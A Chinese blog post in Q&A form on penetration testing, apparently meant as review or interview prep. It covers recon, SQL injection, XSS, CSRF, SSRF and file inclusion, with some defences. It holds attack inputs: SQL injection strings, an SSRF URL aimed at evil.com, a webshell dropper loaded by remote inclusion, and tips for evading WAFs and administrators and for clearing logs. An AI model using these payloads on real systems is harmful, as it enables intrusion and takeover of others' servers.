@@ -1,0 +1,1427 @@
+
+
+  
+    
+  
+
+
+  
+
+
+
+
+  
+
+
+  
+
+<!DOCTYPE html>
+<html lang="zh-cn">
+  <head>
+    
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="generator" content="Hugo 0.29 with theme Tranquilpeak 0.4.1-BETA">
+    <title>渗透问答</title>
+    <meta name="author" content="FreeKnight.Wong">
+    <meta name="keywords" content="FreeKnight, duzhi5368, FreeKnight, Blog, duzhi5368">
+
+    <link rel="icon" href="https://duzhi5368.github.io/favicon.png">
+    
+
+    
+    <meta name="description" content="利用问答方式，对渗透工作做一个全面的基础的回顾和整理。
+
+也可以考虑用作渗透工程师面试题。
+
+">
+    <meta property="og:description" content="利用问答方式，对渗透工作做一个全面的基础的回顾和整理。
+
+也可以考虑用作渗透工程师面试题。
+
+">
+    <meta property="og:type" content="blog">
+    <meta property="og:title" content="渗透问答">
+    <meta property="og:url" content="/2019/12/%E6%B8%97%E9%80%8F%E9%97%AE%E7%AD%94/">
+    <meta property="og:site_name" content="The lost island">
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:title" content="The lost island">
+    <meta name="twitter:description" content="利用问答方式，对渗透工作做一个全面的基础的回顾和整理。
+
+也可以考虑用作渗透工程师面试题。
+
+">
+    
+      <meta name="twitter:creator" content="@duzhi5368">
+    
+    
+
+    
+    
+
+    
+      <meta property="og:image" content="//www.gravatar.com/avatar/323d61e9279c83a8fbccc01acf01f1e2?s=640">
+    
+
+    
+    
+    
+
+    
+
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha256-eZrrJcwDc/3uDhsdt61sL2oOBY362qM3lon1gyExkL0=" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/jquery.fancybox.min.css" integrity="sha256-vuXZ9LGmmwtjqFX1F+EKin1ThZMub58gKULUyf0qECk=" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/helpers/jquery.fancybox-thumbs.min.css" integrity="sha256-SEa4XYAHihTcEP1f5gARTB2K26Uk8PsndQYHQC1f4jU=" crossorigin="anonymous" />
+    
+    
+    <link rel="stylesheet" href="https://duzhi5368.github.io/css/style-fpbzgxsy0kgmdvyrj5ykkg6ratccrk3gocmaqn4xpcjywmv5dteilzucro4f.min.css" />
+    
+    
+
+    
+      
+    
+    
+  </head>
+
+  <body>
+    <div id="blog">
+      <header id="header" data-behavior="4">
+  <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
+  <div class="header-title">
+    <a class="header-title-link" href="https://duzhi5368.github.io/">The lost island</a>
+  </div>
+  
+</header>
+
+      <nav id="sidebar" data-behavior="4">
+  <div class="sidebar-container">
+    
+      <div class="sidebar-profile">
+        <a href="https://duzhi5368.github.io/#about">
+          <img class="sidebar-profile-picture" src="//www.gravatar.com/avatar/323d61e9279c83a8fbccc01acf01f1e2?s=110" alt="作者的图片" />
+        </a>
+        <h4 class="sidebar-profile-name">FreeKnight.Wong</h4>
+        
+          <h5 class="sidebar-profile-bio">Ever tried, ever failed, fail better.</h5>
+        
+      </div>
+    
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://duzhi5368.github.io/">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-home"></i>
+      
+      <span class="sidebar-button-desc">首页</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://duzhi5368.github.io/tags">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-tags"></i>
+      
+      <span class="sidebar-button-desc">标签</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://duzhi5368.github.io/archives">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-archive"></i>
+      
+      <span class="sidebar-button-desc">归档</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://duzhi5368.github.io/#about">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-question"></i>
+      
+      <span class="sidebar-button-desc">关于</span>
+    </a>
+  </li>
+
+
+    </ul>
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://duzhi5368.github.io/OLDPAGE/index.html">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-home"></i>
+      
+      <span class="sidebar-button-desc">OldPage</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://github.com/duzhi5368" target="_blank" rel="noopener">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-github"></i>
+      
+      <span class="sidebar-button-desc">GitHub</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://www.facebook.com/FreeKnight5368" target="_blank" rel="noopener">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-facebook-official"></i>
+      
+      <span class="sidebar-button-desc">Facebook</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://www.flickr.com/photos/158973746@N07" target="_blank" rel="noopener">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-flickr"></i>
+      
+      <span class="sidebar-button-desc">Flickr</span>
+    </a>
+  </li>
+
+
+    </ul>
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://duzhi5368.github.io/index.xml">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-rss"></i>
+      
+      <span class="sidebar-button-desc">RSS</span>
+    </a>
+  </li>
+
+
+    </ul>
+  </div>
+</nav>
+
+      
+
+      <div id="main" data-behavior="4"
+        class="
+               hasCoverMetaIn
+               ">
+        <article class="post" itemscope itemType="http://schema.org/BlogPosting">
+          
+          
+            <div class="post-header main-content-wrap text-left">
+  
+    <h1 class="post-title" itemprop="headline">
+      渗透问答
+    </h1>
+  
+  
+  <div class="postShorten-meta post-meta">
+    
+      <time itemprop="datePublished" datetime="2019-12-23T00:00:00Z">
+        
+  十二月 23, 2019
+
+      </time>
+    
+    
+  
+  
+    <span>发布在</span>
+    
+      <a class="category-link" href="https://duzhi5368.github.io/categories/%e7%a8%8b%e5%ba%8f">程序</a>, 
+    
+      <a class="category-link" href="https://duzhi5368.github.io/categories/2019">2019</a>
+    
+  
+
+
+  </div>
+
+</div>
+          
+          <div class="post-content markdown" itemprop="articleBody">
+            <div class="main-content-wrap">
+              <p>利用问答方式，对渗透工作做一个全面的基础的回顾和整理。</p>
+
+<p>也可以考虑用作渗透工程师面试题。</p>
+
+<p></p>
+
+<h4 id="q-拿到一个站或者域名-你该做些什么">Q： 拿到一个站或者域名，你该做些什么？</h4>
+
+<p>首先，信息收集</p>
+
+<ul>
+<li><p>1、获取域名的whois信息,获取注册者邮箱姓名电话等，丢社工库里看看有没有泄露密码，然后尝试用泄露的密码进行登录后台。用邮箱做关键词进行丢进搜索引擎。利用搜索到的关联信息找出其他邮箱进而得到常用社交账号。社工找出社交账号，里面或许会找出管理员设置密码的习惯 。利用已有信息生成专用字典。</p></li>
+
+<li><p>2、google hack 进一步探测网站的信息，后台，敏感文件</p></li>
+
+<li><p>3、查询服务器旁站，或子域名站点，甚至C段，因为主站一般比较难，所以先看看旁站有没有通用性的cms或者其他漏洞。</p></li>
+
+<li><p>4、查看服务器操作系统版本，web中间件，看看是否存在已知的漏洞，比如IIS，APACHE,NGINX的解析漏洞</p></li>
+
+<li><p>5、查看IP，进行IP地址端口扫描，对响应的端口进行漏洞探测，比如 rsync,心脏出血，mysql,ftp,ssh弱口令等。</p></li>
+
+<li><p>6、扫描网站目录结构，看看是否可以遍历目录，网站Banner，或者备份等敏感文件泄漏，或者使用了某些Github源码等，比如php探针</p></li>
+
+<li><p>7、查看网站是否基于某种框架开发，例如strus2, tp等，然后去找此框架的exp本地测试一下</p></li>
+</ul>
+
+<p>然后，漏洞扫描</p>
+
+<ul>
+<li><p>浏览网站，查看网站规模，功能，特点等</p></li>
+
+<li><p>开始检测漏洞，如XSS，XSRF，sql注入，代码执行，cookie安全监测，敏感信息，通讯数据传输，命令执行，越权访问，重放攻击，目录读取，任意文件读取，下载，文件包含，远程命令执行，弱口令，上传，编辑器漏洞，暴力破解等</p></li>
+</ul>
+
+<p>下一步，漏洞利用</p>
+
+<ul>
+<li>利用以上的方式拿到webshell，或者其他权限</li>
+</ul>
+
+<p>然后，服务器权限提升</p>
+
+<ul>
+<li><p>比如windows下mysql的udf提权，serv-u提权</p></li>
+
+<li><p>windows低版本的漏洞，如iis6,pr,巴西烤肉，</p></li>
+
+<li><p>linux脏牛漏洞，linux内核版本漏洞提权，linux下的mysql system提权以及oracle低权限提权</p></li>
+</ul>
+
+<p>最后，日志清理和输出报告。</p>
+
+<h4 id="q-判断出网站的cms对渗透有什么意义">Q：判断出网站的CMS对渗透有什么意义？</h4>
+
+<p>查找网上已经曝光的程序漏洞</p>
+
+<p>若开源代码，可下载源码进行代码审计</p>
+
+<h4 id="q-如果网站没有使用cms或者cms没漏洞-是否要扫描网站目录">Q：如果网站没有使用CMS或者CMS没漏洞，是否要扫描网站目录？</h4>
+
+<p>要。</p>
+
+<p>依然需要对敏感文件和二级目录进行扫描，可能会发现一些特殊文件，例如 网站备份的压缩文件，说明.txt文档，或者二级目录存放了其他站点，也可能会发现例如.svn目录等</p>
+
+<h4 id="q-常见的网站服务器容器">Q：常见的网站服务器容器？</h4>
+
+<p>IIS, Apache, Nginx, Lighttpd, Tomcat</p>
+
+<h4 id="q-如何手工快速判断目标站是windows还是linux服务器">Q: 如何手工快速判断目标站是windows还是linux服务器？</h4>
+
+<p>linux大小写敏感,windows大小写不敏感。</p>
+
+<h4 id="q-windows机器开启了rdp-但3389端口没有扫描到开放的原因">Q: Windows机器开启了RDP，但3389端口没有扫描到开放的原因？</h4>
+
+<p>RDP端口被修改，被防火墙防护拦截，处于内网（需要端口转发）</p>
+
+<h4 id="q-拿到一个站-发现站里的根目录有-htaccess文件-你能做点什么">Q：拿到一个站，发现站里的根目录有.htaccess文件，你能做点什么？</h4>
+
+<p>.htaccess是一个纯文本文件，它里面存放着Apache服务器配置相关的指令。
+修改.htaccess配置文件后的作用很大，例如页面跳转，例如木马文件类型伪装，SSRF，开启文件上传权限等等</p>
+
+<h4 id="q-如何菜刀绕狗">Q：如何菜刀绕狗？</h4>
+
+<p>安全狗是根据特征码确定是否是一句话木马的，只要前面加一些扰乱字符即可。</p>
+
+<h4 id="q-提权时选择可读写目录-为何尽量不用带空格的目录">Q:提权时选择可读写目录，为何尽量不用带空格的目录？</h4>
+
+<p>因为exp执行时，多需要利用空格来界定参数</p>
+
+<h4 id="q-审查上传点的元素有什么意义">Q：审查上传点的元素有什么意义？</h4>
+
+<p>有些站点的上传文件类型的限制是在前端实现的</p>
+
+<h4 id="q-目标站无防护-上传图片可以正常访问-上传脚本格式访问则403-什么原因">Q:目标站无防护，上传图片可以正常访问，上传脚本格式访问则403.什么原因？</h4>
+
+<p>原因很多，有可能web服务器配置把上传目录写死了不执行相应脚本，尝试改后缀名绕过</p>
+
+<h4 id="q-在win2003服务器中建立一个-test-文件夹用意何为">Q:在win2003服务器中建立一个 .test 文件夹用意何为？</h4>
+
+<p>以 . 开头命名的文件夹，在windows中为隐藏文件夹，为了不让管理员发现</p>
+
+<h4 id="q-什么是tcp-syn扫描-tcp-的半连接扫描">Q:什么是TCP SYN扫描(TCP 的半连接扫描)？</h4>
+
+<p>利用 TCP 前两次握手，如第二次握手回复了，则证明端口开放。因为没有第三次握手建立连接，降低了被发现的可能，同时提高了扫描性能</p>
+
+<h4 id="q-php代码执行-文件读取-命令执行的函数都有哪些">Q：PHP代码执行，文件读取，命令执行的函数都有哪些？</h4>
+
+<ul>
+<li>代码执行：
+eval,preg_replace+/e,assert,call_user_func,call_user_func_array,create_function</li>
+<li>文件读取：
+file_get_contents(),highlight_file(),fopen(),readfile(),fread(),fgetss(), fgets(),parse_ini_file(),show_source(),file()等</li>
+<li>命令执行：
+system(), exec(), shell_exec(), passthru() ,pcntl_exec(), popen(),proc_open()</li>
+</ul>
+
+<h4 id="q-如何绕过waf">Q:如何绕过waf？</h4>
+
+<ul>
+<li>大小写转换法</li>
+<li>干扰字符 ‘/<em>’ ‘!’ ‘</em>/’</li>
+<li>编码 base64 unicode hex url ascll</li>
+<li>复参数</li>
+</ul>
+
+<h4 id="q-如何向服务器写入webshell">Q：如何向服务器写入webshell？</h4>
+
+<ul>
+<li>各种上传漏洞</li>
+<li>mysql具有写入权限,用sql语句写入shell</li>
+<li>http put方法</li>
+</ul>
+
+<h4 id="q-渗透测试中常见的端口">Q：渗透测试中常见的端口？</h4>
+
+<pre><code>21 ftp 【弱口令，端口爆破】
+22 SSH 【弱口令，端口爆破】
+23 Telnet 【弱口令，端口爆破】
+80 web 
+80-89 web 
+161 SNMP 
+389 LDAP 
+443 SSL心脏滴血以及一些web漏洞测试 
+445 SMB 
+512,513,514 Rexec 
+873 Rsync未授权 
+1025,111 NFS 
+1433 MSSQL【数据库弱口令】
+1521 Oracle:(iSqlPlus Port:5560,7778) 【数据库弱口令】
+2082/2083 cpanel主机管理系统登陆 （国外用较多）
+2222 DA虚拟主机管理系统登陆 （国外用较多） 
+2601,2604 zebra路由，默认密码zebra 【弱口令，端口爆破】
+3128 squid代理默认端口，如果没设置口令很可能就直接漫游内网了 
+3306 MySQL 【数据库弱口令】
+3312/3311 kangle主机管理系统登陆 
+3389 Windows RDP远程桌面 【弱口令，端口爆破】
+4440 rundeck 参考WooYun: 借用新浪某服务成功漫游新浪内网 
+5432 PostgreSQL 【数据库弱口令】
+5900 vnc 
+5984 CouchDB http://xxx:5984/_utils/ 
+6082 varnish 参考WooYun: Varnish HTTP accelerator CLI 未授权访问易导致网站被直接篡改或者作为代理进入内网 
+6379 redis未授权 
+7001,7002 WebLogic默认弱口令，反序列 
+7778 Kloxo主机控制面板登录 
+8000-9090 都是一些常见的web端口，有些运维喜欢把管理后台开在这些非80的端口上 
+8080 tomcat/WDCP主机管理系统，默认弱口令 
+8080,8089,9090 JBOSS 
+8083 Vestacp主机管理系统 （国外用较多） 
+8649 ganglia 
+8888 amh/LuManager 主机管理系统默认端口 
+9200,9300 elasticsearch
+10000 Virtualmin/Webmin 服务器虚拟主机管理系统 
+11211 memcache未授权访问 
+27017,27018 Mongodb未授权访问 
+28017 mongodb统计页面 
+50000 SAP命令执行 
+50070,50030 hadoop默认端口未授权访问
+</code></pre>
+
+<h4 id="q-sql注入防护方法">Q:SQL注入防护方法？</h4>
+
+<pre><code>- 使用参数绑定，SQL预编译（PDO等）
+- 对输入的特殊字符进行Escape转义处理
+- 使用白名单来规范化输入验证方法
+- 对客户端输入进行控制，不允许输入SQL注入相关的特殊字符
+- 服务器端在提交数据库进行SQL查询之前，对特殊字符进行过滤、转义、替换、删除。
+- 规范编码,字符集
+</code></pre>
+
+<h4 id="q-如何突破注入时字符转义">Q：如何突破注入时字符转义？</h4>
+
+<p>宽字符注入，Hex编码绕过</p>
+
+<h4 id="q-为什么参数化查询可以防止sql注入-有什么缺点">Q：为什么参数化查询可以防止sql注入？有什么缺点？</h4>
+
+<p>使用参数化查询数据库服务器不会把参数的内容当作sql指令的一部分来执行，是在数据库完成sql指令的编译后才套用参数运行。即预编译。</p>
+
+<p>简单的说: 参数化能防注入的原因在于,语句是语句，参数是参数，参数的值并不是语句的一部分，数据库只按语句的语义跑</p>
+
+<p>缺点是：在预编译时，不能灵活处理字段名，对部分API需求无法满足。</p>
+
+<h4 id="q-通过http头sql注入有哪些点-举例">Q：通过Http头SQL注入有哪些点？举例。</h4>
+
+<p>X_FORWARDED_FOR：如果代码中getip()进行同IP访问次数检测，就可以触发。因为getip()函数GET了这个头</p>
+
+<pre><code>127.0.0.1' or 1=1#  //绕过安全认证
+</code></pre>
+
+<p>UA：如果服务方想统计用户操作系统，浏览器等信息，将UA存入数据库则会触发。</p>
+
+<pre><code>aaa' or 1/* 
+</code></pre>
+
+<p>REFERER：如果来源URL被存储数据则会触发。
+COOKIE：如果ASP服务代码中有 Request.cookie 方式来提交变量，则可能触发。
+Client-IP: 如果代码中getip()进行同IP访问次数检测，就可以触发。因为getip()函数GET了这个头</p>
+
+<h4 id="q-盲注是什么-怎么盲注">Q：盲注是什么？怎么盲注？</h4>
+
+<p>盲注是在SQL注入攻击过程中，服务器关闭了错误回显，我们单纯通过服务器返回内容的变化来判断是否存在SQL注入和利用的方式。</p>
+
+<p>盲注的手段有两种：</p>
+
+<ul>
+<li><p>一个是通过页面的返回内容是否正确(boolean-based)，来验证是否存在注入。</p>
+
+<ul>
+<li>一个是通过sql语句处理时间的不同来判断是否存在注入(time-based)，在这里，可以用benchmark，sleep等造成延时效果的函数，也可以通过构造大笛卡儿积的联合查询表来达到延时的目的。</li>
+</ul></li>
+</ul>
+
+<h4 id="q-sql宽字节注入是什么-举例">Q：SQL宽字节注入是什么？举例。</h4>
+
+<p>例如，PHP代码为</p>
+
+<pre><code>    $conn = mysql_connect('localhost', 'root', 'password') or die('error');
+    mysql_query(&quot;SET NAMES 'gbk'&quot;);
+    mysql_select_db('data', $conn) OR dir('error');
+    $id = isset($_GET['id']) ? addslashes($_GET['id']) : 1;
+    $sql = &quot;SELECT * FROM xx WHERE id = '{$id}'&quot;;
+    $result = mysql_query($sql, $conn) or die('error');
+</code></pre>
+
+<pre><code>    请求：http://192.168.3.23/wide/0x01/index.php?id=2'
+    PHP中：   id=2'   --&gt;  id=2%23  --&gt; id=%232%57%23%23 --&gt; id='2\''
+    SQL函数：  SELECT * FROM xx WHERE id = '2\''
+    结论：addslashes()对提交的单引号做了转义
+    
+    请求：http://192.168.3.23/wide/0x01/index.php?id=2%df'
+    PHP中： id=2%df' --&gt;  id=2%df%23 --&gt; id=%232%df%57%23%23 --&gt; id='2運''
+    SQL函数：  SELECT * FROM xx WHERE id = '2運''
+    结论：%df 这个宽字符导致addslashes()的转义失效，应该是 '2運\'' 的，结果成了 '2運''
+    
+    请求：http://192.168.3.23/wide/0x01/index.php?id=2%df' and 1=12 %23
+    SQL函数：  SELECT * FROM xx WHERE id = '2運' and 1=12 #'
+    结论：已经注入了
+    
+</code></pre>
+
+<p>上面可见，由于设置了MySQL数据编码为GBK导致，%df和\ 反斜杠(%5c) 组合成了&rsquo;運&rsquo;这个中文字。</p>
+
+<p>上面样例是gbk，其实gb2312, big5等编码都有该问题。</p>
+
+<p>防御方案：</p>
+
+<pre><code>前端，后端，数据库，全部统一用UTF-8
+</code></pre>
+
+<h4 id="q-sql二次注入是什么-举例">Q：SQL二次注入是什么？举例。</h4>
+
+<p>例如， PHP代码为</p>
+
+<pre><code>    $a=addslashes($_GET['id'])
+    $b=urldecode($a)
+</code></pre>
+
+<pre><code>    请求：http://192.168.3.23/wide/0x01/index.php?id=1%2527
+    PHP中：   源 = 1%2527
+            $a = 1%27
+            $b = 1'
+    
+</code></pre>
+
+<h4 id="q-sql里面仅仅提供了update命令-该如何利用">Q：SQL里面仅仅提供了UPDATE命令，该如何利用。</h4>
+
+<p>我们假设有如下SQL语句权限</p>
+
+<pre><code> UPDATE user SET password='MD5($password)', homepage='$homepage' WHERE id='$id'
+</code></pre>
+
+<p>我们将其中的变量做一些调整：</p>
+
+<pre><code>    赋值：让password 为 mypass)' WHERE username='admin'#
+    SQL语句：UPDATE user SET password='MD5(mypass)' WHERE username='admin'#)', homepage='$homepage' WHERE id='$id'
+    效果：修改管理员密码
+    
+    赋值：让id 为 ' OR username='admin'
+    SQL语句：UPDATE user SET password='MD5($password)', homepage='$homepage' WHERE id='' OR username='admin'
+    效果：修改管理员密码
+</code></pre>
+
+<h4 id="q-sqlmap-怎么对一个注入点注入">Q：sqlmap，怎么对一个注入点注入？</h4>
+
+<ul>
+<li>如果是get，直接，sqlmap -u “网址”.</li>
+<li>如果是post，可以sqlmap -u “网址” –data=”post的参数”</li>
+<li>如果是cookie，X-Forwarded-For等，可以访问的时候，用burpsuite抓包，注入处进行替换，放到文件里，然后sqlmap -r “文件地址”</li>
+</ul>
+
+<h4 id="q-mysql注入-对5-0以上和5-0以下有什么区别">Q：MySQL注入，对5.0以上和5.0以下有什么区别？</h4>
+
+<p>5.0以下没有information_schema这个系统表，无法列表名等，只能暴力跑表名。</p>
+
+<h4 id="q-sql注入有以下两个测试选项-选一个并且阐述不选另一个的理由">Q:sql注入有以下两个测试选项，选一个并且阐述不选另一个的理由?</h4>
+
+<pre><code>    A. demo.jsp?id=2+1 
+    B. demo.jsp?id=2-1 
+</code></pre>
+
+<p>选B，在 URL 编码中 + 代表空格，可能会造成混淆</p>
+
+<h4 id="q-代替空格的方法">Q:代替空格的方法?</h4>
+
+<p>%0a、%0b、%a0 等 , /**/ 等注释符, &lt;&gt;</p>
+
+<h4 id="q-xss原理-有哪几类型">Q:XSS原理？有哪几类型？</h4>
+
+<ul>
+<li>反射型</li>
+</ul>
+
+<p>用户提交的数据中可以构造代码来执行，从而实现窃取用户信息等攻击。需要诱使用户“点击”一个精心构造的恶意链接，才能攻击成功。</p>
+
+<p>就是找一个网址，如 www.baidu.com/index.jsp?param=XXOOXXOO ,然后传入我们自己的参数 XXOOXXOO，然后在服务器响应时，会某种方式将 XXOOXXOO 再次返回给客户端，而返回后 XXOOXXOO如果是一些可以在浏览器中被执行的东西，就达成了目的，这就是反射XSS。</p>
+
+<p>当然没人会无聊的自己反射自己，于是就可以把这样的一个链接给别人去点，就好了。</p>
+
+<ul>
+<li>储存型</li>
+</ul>
+
+<p>存储型XSS会把用户输入的数据“存储”在服务器端。这种XSS具有很强的稳定性。</p>
+
+<p>例如论坛里面发帖子，然后帖子里做一些特殊处理，被存储到服务器，之后其他用户要查看该贴，特殊处理的东西被执行，就会让别人受害。</p>
+
+<p>这种类型XSS持久性强，也很适合做成蠕虫等。</p>
+
+<ul>
+<li>DOM型</li>
+</ul>
+
+<p>通过修改页面的DOM节点形成的XSS，称之为DOM Based XSS。他和反射型XSS区别在于，它不会和后台交互，是完全的WEB前端安全问题，只能在前端做防御。</p>
+
+<p>他和反射型一样，构造一个  www.baidu.com/index.jsp?param=XXOOXXOO 链接，然后这个链接中的参数 XXOOXXOO，不会丢到后端，而是直接在本地浏览器里做了处理，因代码考虑不周，导致处理得到一些不好的结果。</p>
+
+<p>当然没人会无聊的自己反射自己，于是就可以把这样的一个链接给别人去点，就好了。</p>
+
+<p>因为不过服务器，所以既没WAF烦，也不限制长度（不会受到后端逻辑限制）。</p>
+
+<p>常用document.write、innerHTML赋值、outterHTML赋值、window.location操作、写javascript:XXOO、eval、setTimeout 、setInterval 等直接执行之类的函数点</p>
+
+<h4 id="q-csrf的原理">Q：CSRF的原理？</h4>
+
+<p>跨站请求伪造攻击，是客户端发起。简而言之，黑客盗用了用户身份，伪装为用户发送恶意请求。</p>
+
+<p>例如，我们诱骗用户访问我的网页，然后在网页里加入</p>
+
+<pre><code>    &lt;img src=http://admin:admin@192.168.1.1 /&gt; 
+</code></pre>
+
+<p>这会导致用户浏览器向路由器申请一次登录。如果账密正确，路由器会给用户机一个合法的Session，然后我们网页的其他JS代码就可以对用户路由器做一些恶意操作了。</p>
+
+<p>这个对路由器的访问请求，不是用户自愿发起的。但路由器却以为是用户发起的。这就是CSRF。</p>
+
+<h4 id="q-如何防止csrf">Q：如何防止CSRF?</h4>
+
+<ul>
+<li>验证Head头中的referer</li>
+<li>验证token</li>
+</ul>
+
+<h4 id="q-token和referer做横向对比-谁安全等级高">Q：token和referer做横向对比，谁安全等级高？</h4>
+
+<p>token安全等级更高，因为并不是任何服务器都可以取得referer。</p>
+
+<p>如果从HTTPS跳到HTTP，也不会发送referer。并且FLASH一些版本中可以自定义referer。</p>
+
+<p>但是使用token的话，要保证其足够随机且不可泄露。(不可预测性原则)</p>
+
+<h4 id="q-使用token的话-我们需要如何突破token机制">Q：使用Token的话，我们需要如何突破Token机制？</h4>
+
+<p>针对token的攻击，一是对它本身的攻击，重放测试一次性、分析加密规则、校验方式是否正确等，二是结合信息泄露漏洞对它的获取，结合着发起组合攻击。</p>
+
+<p>信息泄露有可能是缓存、日志、get，也有可能是利用跨站</p>
+
+<p>很多跳转登录的都依赖token，有一个跳转漏洞加反射型跨站就可以组合成登录劫持了</p>
+
+<h4 id="q-ssrf原理和例子">Q：SSRF原理和例子</h4>
+
+<p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。</p>
+
+<p>一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p>
+
+<p>在页面源码中查找访问的资源地址 ，如果该资源地址类型为 www.baidu.com/xxx.php?image=XXOOUrl 的就可能存在SSRF漏洞。此时，我们看似在访问baidu网站，但实际请求的数据却是XXOOUrl中的数据，如果Url是baidu内网服务器，那就相当于，利用baidu.com访问其内网服务器资源。</p>
+
+<p>当找到一个 SSRF 时，第一件事情就是测试对应可支持的 url scheme，如：</p>
+
+<pre><code>file:// -- http://example.com/ssrf.php?url=file:///C:/Windows/win.ini
+dict:// -- http://example.com/ssrf.php?dict://ad.com:1337/
+sftp:// -- http://example.com/ssrf.php?url=sftp://ad.com:1337/
+tftp:// -- http://example.com/ssrf.php?url=tftp://evil.com:1337/TESTUDPPACKET
+gopher:// -- http://example.com/ssrf.php?url=http://ad.com/gopher.php
+</code></pre>
+
+<h4 id="q-文件上传漏洞原理-攻防方案">Q：文件上传漏洞原理，攻防方案？</h4>
+
+<p>由于程序员在对用户文件上传部分的控制不足或者处理缺陷，而导致用户可以越过其本身权限向服务器上传可执行的动态脚本文件</p>
+
+<p><strong>常见的上传绕过方式</strong></p>
+
+<ul>
+<li>前端js验证：禁用js/burp改包</li>
+<li>大小写</li>
+<li>双重后缀名</li>
+<li>过滤绕过 pphphp-&gt;php</li>
+</ul>
+
+<p><strong>防护方式</strong></p>
+
+<ul>
+<li>文件上传目录设置为不可执行</li>
+<li>使用白名单判断文件上传类型</li>
+<li>用随机数改写文件名和路径</li>
+</ul>
+
+<h4 id="q-文件包含漏洞原理-攻防方案">Q:文件包含漏洞原理，攻防方案？</h4>
+
+<p>引入一段用户能控制的脚本或代码，并让服务器端执行 include() 等函数通过动态变量的方式引入需要包含的文件；用户能够控制该动态变量。</p>
+
+<p>例如：</p>
+
+<ul>
+<li>网站有个PHP文件，内容有</li>
+</ul>
+
+<pre><code>    &lt;?php
+    include 'phar://test.rar/test.txt';
+    ?&gt;
+</code></pre>
+
+<p>然后目录底下有个文件是个压缩包test.rar（内部有个test.txt文件），txt文件内容如下</p>
+
+<pre><code>    &lt;?php
+    phpinfo();
+    ?&gt;
+</code></pre>
+
+<p>然后用户访问 <a href="http://xxoo.com/xxoo.php">http://xxoo.com/xxoo.php</a> 则会显示PHP version info。</p>
+
+<p><strong>导致文件漏洞的函数</strong></p>
+
+<p>PHP：include(), include_once(), require(), re-quire_once(), fopen(), readfile(), … JSP/Servlet：ava.io.File(), java.io.Fil-eReader(), … ASP：include file, include virtual</p>
+
+<p><strong>利用</strong></p>
+
+<p>获取敏感信息：</p>
+
+<pre><code>    Linux: http://www.xxoo.com/index.php?page=/etc/passwd
+    Windows: http://www.xxx.com/index.php?page=C:/windows/php.ini
+</code></pre>
+
+<p>上传a.jpg这种一句话木马到自己的站点或者目标站（取决于是否允许远程资源访问以及是否允许文件上传），内部代码如下</p>
+
+<pre><code>    # 需将下一行代码中的 # 符号换成 ? 符号……某志我在提交github时候被github安全杀掉了...死活提交不上去Orz
+    &lt;#fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&quot;&lt;#php eval($_POST[nmask]);#&gt;&quot;)#&gt;
+</code></pre>
+
+<p>然后执行</p>
+
+<pre><code>    http://www.xxoo.com/index.php?page=http://www.myshell.com/a.jpg
+    http://www.xxoo.com/index.php?page=./a.jpg
+</code></pre>
+
+<p>即可生成shell.php木马后面</p>
+
+<p>或者可以配合使用截断等方式。</p>
+
+<p><strong>防御</strong></p>
+
+<ul>
+<li>开启open_basedir函数，将其设置为指定目录，则只有该目录的文件允许被访问。</li>
+<li>关闭allow_url_include函数，防止远程文件包含。</li>
+</ul>
+
+<h4 id="q-什么是中间人工具-它的常见手段有">Q：什么是中间人工具，它的常见手段有？</h4>
+
+<p>这种攻击模式是通过各种技术手段将受入侵者控制的一台计算机虚拟放置在网络连接中的两台通信计算机之间，这台计算机就称为“中间人”。</p>
+
+<p>它的常见手段有：</p>
+
+<ul>
+<li>ARP欺骗</li>
+<li>DNS欺骗</li>
+</ul>
+
+<p>推荐使用Kali的Ettercap，Dsniff工具</p>
+
+<h4 id="q-arp欺骗原理和防护">Q：ARP欺骗原理和防护？</h4>
+
+<p>每台主机都有一个ARP缓存表，缓存表中记录了IP地址与MAC地址的对应关系，而局域网数据传输依靠的是MAC地址。</p>
+
+<p>在ARP缓存表机制存在一个缺陷，就是当请求主机收到ARP应答包后，不会去验证自己是否向对方主机发送过ARP请求包，就直接把这个返回包中的IP地址与MAC地址的对应关系保存进ARP缓存表中，如果原有相同IP对应关系，原有的则会被替换。</p>
+
+<p>这个映射表可以通过arp -a来查看。</p>
+
+<p>只要攻击者主动向受害机发送ARP欺骗消息，声称自己是网关，就有了偷听主机传输的数据的可能。</p>
+
+<p><strong>防御</strong></p>
+
+<ul>
+<li>和其他同网关的机器对比自己的ARP表，看看是不是被修改了</li>
